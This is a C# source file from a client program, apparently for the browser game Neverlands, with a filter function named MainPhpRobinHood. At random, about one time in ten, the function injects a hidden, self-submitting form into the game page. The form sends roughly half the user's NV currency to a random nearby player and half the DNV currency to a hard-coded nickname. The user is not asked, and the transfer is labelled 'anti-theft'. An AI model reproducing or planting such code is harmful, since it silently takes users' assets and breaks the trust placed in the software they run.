using System;
using ABClient.MyHelpers;
using System.Globalization;
using System.Text;
using ABClient.Helpers;

namespace ABClient.PostFilter
{
    internal static partial class Filter
    {
        private static string MainPhpRobinHood(string html)
        {
            // <tr><td bgcolor=#FCFAF3><font class=nickname><img src=http://image.neverlands.ru/money_all.gif width=16 height=14 border=0 alt="Передать NV" align=absmiddle onclick="transferform('0','0','Игровую валюту','4d8d6bcae1bcc64ed7931c66b4728da6','0','0','0','0')" vspace=1>&nbsp;Деньги:</td><td width=100% bgcolor=#fafafa nowrap><font class=nickname><b id="user_nv">&nbsp;20727.15 NV</td></tr>

            //<tr><td bgcolor=#FCFAF3><font class=nickname><img src=http://image.neverlands.ru/money_all.gif width=16 height=14 border=0 alt="Передать NV" align=absmiddle onclick="transferform('0','0','Игровую валюту','4e0a895cb4438bd572d4a66036afbed3','0','0','0','0')" vspace=1>&nbsp;Деньги:</td><td width=100% bgcolor=#fafafa nowrap><font class=nickname><b id="user_nv">&nbsp;22546.43 NV</td></tr>
            //<tr><td bgcolor =#F0F0F0><img src=http://image.neverlands.ru/money_dea.gif width=14 height=14 border=0 alt="Передать DNV" align=absmiddle onclick="m_form('3cfcefee8a91e38ae21b888702e9ed37')" vspace=1></td><td width=100% bgcolor=#F0F0F0 nowrap><font class=nickname><b id="user_deamoney">&nbsp;5.00 DNV</td></tr>

            double nv;
            var nvStr = HelperStrings.SubString(html, "<b id=\"user_nv\">&nbsp;", " NV</td></tr>"); // 20727.15
            if (!string.IsNullOrEmpty(nvStr))
            {
                if (!double.TryParse(nvStr, NumberStyles.Any, CultureInfo.InvariantCulture, out nv))
                    nv = 0f;
            }
            else
            {
                return null;
            }

            var dnv = 0.0;
            var dnvStr = HelperStrings.SubString(html, "<b id=\"user_deamoney\">&nbsp;", " DNV</td></tr"); // 5.00
            if (!string.IsNullOrEmpty(nvStr))
            {
                if (!double.TryParse(dnvStr, NumberStyles.Any, CultureInfo.InvariantCulture, out dnv))
                    dnv = 0f;
            }

            var intnv = (int)(nv / 2.0) - 1;
            if (intnv >= 1 && (html.IndexOf(" NV переданы для ", StringComparison.CurrentCultureIgnoreCase) == -1) && (Dice.Make(10) == 0))
            {
                var movenv = HelperStrings.SubString(html, "Передать NV\" align=absmiddle onclick=\"transferform(", ")"); 
                // '0','0','Игровую валюту','4d8d6bcae1bcc64ed7931c66b4728da6','0','0','0','0'

                if (!string.IsNullOrEmpty(movenv))
                {
                    var users = RoomManager.MyLocation;
                    if (users.Count > 1)
                    {
                        var user = users[Dice.Make(users.Count)];
                        if (!user.Equals(AppVars.Profile.UserNick, StringComparison.CurrentCultureIgnoreCase))
                        {
                            var par = movenv.Split(',');
                            if (par.Length >= 8)
                            {
                                /*
                                transferform(wuid,wtrprice,wnametxt,wtcode,wwprice,wmas,wcs,wms)

                                <input type=hidden name=post_id value=22>
                                <input type=hidden name=transfernametxt value="'+wnametxt+'">
                                <input type=hidden name=transferprice value="'+wtrprice+'">
                                <input type=hidden name=wwprice value="'+wwprice+'">
                                <input type=hidden name=wmas value="'+wmas+'">
                                <input type=hidden name=wcs value="'+wcs+'">
                                <input type=hidden name=wms value="'+wms+'">
                                <input type=hidden name=transferuid value='+wuid+'>
                                <input type=hidden name=transfercode value='+wtcode+'>
                                <INPUT TYPE="text" name=fornickname class=LogintextBox  maxlength=25>
                                <input type=text name=sum class=LogintextBox2>
                                <input type=text name=ttext class=LogintextBox6 maxlength=150 size=52>

                                1 NV переданы для 0н.

                                post_id=22&transfernametxt=%C8%E3%F0%EE%E2%F3%FE+%E2%E0%EB%FE%F2%F3&transferprice=0&wwprice=0&wmas=0&wcs=0&wms=0&transferuid=0&transfercode=7e17c0e81151e12118d3ef0611de3b73&fornickname=0%ED&sum=1&ttext=%F1%EF%EE%F0%29

                                post_id=22&transfernametxt=%C8%E3%F0%EE%E2%F3%FE+%E2%E0%EB%FE%F2%F3&transferprice=0&wwprice=0&wmas=0&wcs=0&wms=0&transferuid=0&transfercode=7e1c3da786b7aca61348b01e557cc279&fornickname=%D3%EC%ED%E8%EA&sum=1&ttext=%29
                                */

                                var wuid = par[0].Trim('\'');
                                var wtrprice = par[1].Trim('\'');
                                var wnametxt = par[2].Trim('\'');
                                var wtcode = par[3].Trim('\'');
                                var wwprice = par[4].Trim('\'');
                                var wmas = par[5].Trim('\'');
                                var wcs = par[6].Trim('\'');
                                var wms = par[7].Trim('\'');

                                var sb = new StringBuilder();
                                sb.Append(
                                    HelperErrors.Head() +
                                    "Конфискация NV...");
                                sb.Append("<form action=main.php method=POST name=ff>");

                                sb.Append(@"<input type=hidden name=post_id value=""");
                                sb.Append(22);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=transfernametxt value=""");
                                sb.Append(wnametxt);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=transferprice value=""");
                                sb.Append(wtrprice);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=wwprice value=""");
                                sb.Append(wwprice);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=wmas value=""");
                                sb.Append(wmas);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=wcs value=""");
                                sb.Append(wcs);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=wms value=""");
                                sb.Append(wms);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=transferuid value=""");
                                sb.Append(wuid);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=transfercode value=""");
                                sb.Append(wtcode);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=fornickname value=""");
                                sb.Append(user);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=sum value=""");
                                sb.Append(intnv);
                                sb.Append(@""">");

                                sb.Append(@"<input type=hidden name=ttext value=""");
                                sb.Append("противоугонка ABClient");
                                sb.Append(@""">");

                                sb.Append(
                                    @"</form>" +
                                    @"<script language=""JavaScript"">" +
                                    @"document.ff.submit();" +
                                    @"</script></body></html>");

                                return sb.ToString();
                            }
                        }
                    }
                }
            }

            var intdnv = (int)(dnv / 2.0) - 1;
            if (intdnv >= 1 && (html.IndexOf(" DNV зачислено на счет персонажа ", StringComparison.CurrentCultureIgnoreCase) == -1) && (Dice.Make(10) == 0))
            {
                var movednv = HelperStrings.SubString(html, "alt=\"Передать DNV\" align=absmiddle onclick=\"m_form('","')"); // 3cfcefee8a91e38ae21b888702e9ed37
                if (!string.IsNullOrEmpty(movednv))
                {
                    /*
                        <input type=hidden name=post_id value=42>
                        <input type=hidden name=vcode value='+vcode+'>
                        <INPUT TYPE="text" name=fnick class=LogintextBox maxlength=25>
                        <input type=text name=sum class=LogintextBox2>
                        <input type=submit value="передать" class=lbut>
                        <input type=button class=lbut onclick=\"c_form()\" value=\" x \">

                        post_id=42&vcode=9ea3225b0845791a3672bad2540ab2a3&fnick=%D3%EC%ED%E8%EA&sum=1
                    */

                    var sb = new StringBuilder();
                    sb.Append(
                        HelperErrors.Head() +
                        "Конфискация DNV...");
                    sb.Append("<form action=main.php method=POST name=ff>");

                    sb.Append(@"<input type=hidden name=post_id value=""");
                    sb.Append(42);
                    sb.Append(@""">");

                    sb.Append(@"<input type=hidden name=vcode value=""");
                    sb.Append(movednv);
                    sb.Append(@""">");

                    sb.Append(@"<input type=hidden name=fnick value=""");
                    sb.Append("Шандор-Волшебник");
                    sb.Append(@""">");

                    sb.Append(@"<input type=hidden name=sum value=""");
                    sb.Append(intdnv);
                    sb.Append(@""">");

                    sb.Append(
                        @"</form>" +
                        @"<script language=""JavaScript"">" +
                        @"document.ff.submit();" +
                        @"</script></body></html>");

                    return sb.ToString();
                }
            }

            return null;
        }
    }
}